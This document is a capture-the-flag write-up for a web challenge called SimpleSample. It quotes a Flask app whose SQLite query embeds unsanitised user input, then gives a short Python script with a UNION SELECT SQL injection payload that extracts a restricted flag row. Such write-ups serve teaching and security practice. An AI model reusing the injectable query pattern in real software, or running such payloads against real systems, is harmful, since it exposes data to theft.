# SimpleSample

## Description

```
We have gained access to the genome browser of a large pharmaceutical company. I'm sure they're hiding something in there.
```

## Categories

- `web`

## Provided Files

- `simplesample.zip`

## Solve Process

This challenge involves some `sqlite3` knowledge to modify a query string correctly.

```py
# --- snip --- #
def add_flag():
    conn = sqlite3.connect(f"file:{DATABASE}?mode=rw")
    conn.execute("INSERT INTO genomes (name, description, sequence, restricted) VALUES (?, ?, ?, ?)", ("ACSC", "Unknown mutation, under evaluation", FLAG, 1))
    conn.commit()
    conn.close()
# --- snip --- #
@app.route('/', methods=['GET'])
@rate_limited(RATE_LIMIT)
@compressed
def index():
    query = request.args.get('query')
    had_query = bool(query)
    if not query:  # display default query
        query = "GGAGGTGGGTTCGAGCCCAACTTCATGCTCTTCGAGAAGTGCGAGGTGAACGGTGCGGGG"

    try:
        conn = get_db_connection()
        results = conn.execute(f"SELECT * FROM genomes WHERE sequence LIKE '%{query}%'").fetchall()
        conn.close()
    except sqlite3.OperationalError:
        results = []

    if any(result['restricted'] == 1 for result in results):
        results = [{"id": -1, "sequence": "Restricted results"}]
    elif len(results) > 4:
        results = [{"id": -1, "sequence": "Too many results"}]

    if not had_query:  # no need to show default query
        query = None

    return render_template('index.html', results=results, query=query)
# --- snip --- #
```

We can see that in `results = conn.execute()`, a direct python format string is used which includes unsanitized user input from `query` directly in the fetch call. The following code checks for the `restricted = 1` value that is set in the `add_flag()` function, where the flag is loaded and stored.

To extend the `SELCET` query, we can use `UNION ALL`, while making sure that we do not include the `restricted` field in our results. This lets us pass the security check. Finally we can fetch the correct database entry buy using another `WHERE name LIKE`.

```py
from requests import get
from urllib.parse import quote

chall_url = "bks5qskwce1h4g3c.dyn.acsc.land"
payload = quote("xxx%' UNION SELECT sequence, sequence, sequence, sequence, sequence FROM genomes WHERE name LIKE '%ACSC")

url = f"https://{chall_url}/?query={payload}"
response = get(url)
print(response.text)
```

This gets us another flag.
